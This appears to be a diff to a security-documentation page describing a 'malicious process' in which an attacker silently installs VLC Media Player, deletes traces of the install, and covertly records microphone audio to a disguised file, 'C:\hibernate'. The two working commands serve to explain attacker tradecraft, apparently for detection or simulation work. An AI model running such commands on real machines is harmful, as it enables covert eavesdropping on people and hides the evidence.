@@ -11,10 +11,7 @@ Malicious Process
 
 The following commands demonstrate how an attacker can use VLC Media Player to record audio from a workstation's microphone and hide the recorded file:
 
-1.  This command installs VLC Media Player silently, waits for 40 seconds, and then deletes the installer and any desktop shortcuts created.
-  ```shell
-  C:\vlcsetup.exe /S & ping 0.0.0.0 -n 40 >/nul & del /F /Q "%systemdrive%\Users\Public\Desktop\VLC media player\*\*" & del C:\vlcsetup.exe`
-  ```
+1.  This command installs VLC Media Player silently, waits for 40 seconds, and then deletes the installer and any desktop shortcuts created.`  C:\vlcsetup.exe /S & ping 0.0.0.0 -n 40 >/nul & del /F /Q "%systemdrive%\Users\Public\Desktop\VLC media player\*\*" & del C:\vlcsetup.exe`
     
 2.  C:\Progra~1\VideoLAN\VLC\vlc.exe --one-instance dshow:// :dshow-vdev=none :dshow-adev :sout=#transcode{vcodec=h264,scale=Auto,acodec=mpga,ab=128,channels=2,samplerate=44100}:duplicate{dst=std{access=file,mux="ogg",dst="C:\hibernate"}}This command starts VLC in a single instance mode, captures audio from the default audio device, and saves the recording to a file named **hibernate** in the root of the C drive.
     
